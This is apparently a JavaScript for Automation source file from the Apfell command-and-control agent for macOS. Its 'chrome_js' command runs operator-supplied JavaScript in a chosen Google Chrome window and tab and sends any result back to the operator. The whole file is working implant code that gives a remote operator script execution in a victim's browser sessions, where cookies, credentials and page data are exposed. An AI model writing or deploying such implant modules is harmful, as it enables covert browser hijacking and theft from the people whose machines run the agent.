exports.chrome_js = function(task, command, params){
    try{
        let split_params = JSON.parse(params);
        let window = split_params['window'];
        let tab = split_params['tab'];
        let jscript = split_params['javascript'];
        if(Application("Google Chrome").running()){
            let result = Application("Google Chrome").windows[window].tabs[tab].execute({javascript:jscript});
            if(result !== undefined){
                return JSON.stringify({"user_output": String(result), "completed": true});
            }
            return JSON.stringify({"user_output":"completed", "completed": true});
        }else{
            return JSON.stringify({"user_output":"Chrome isn't running", "completed": true, "status": "error"});
        }
    }catch(error){
        let err = error.toString();
		if(err === "Error: An error occurred."){
		    err += " Apfell was denied access to Google Chrome (either by popup or prior deny).";
		}
		return JSON.stringify({"user_output":err, "completed": true, "status": "error"});
    }
};
COMMAND_ENDS_HERE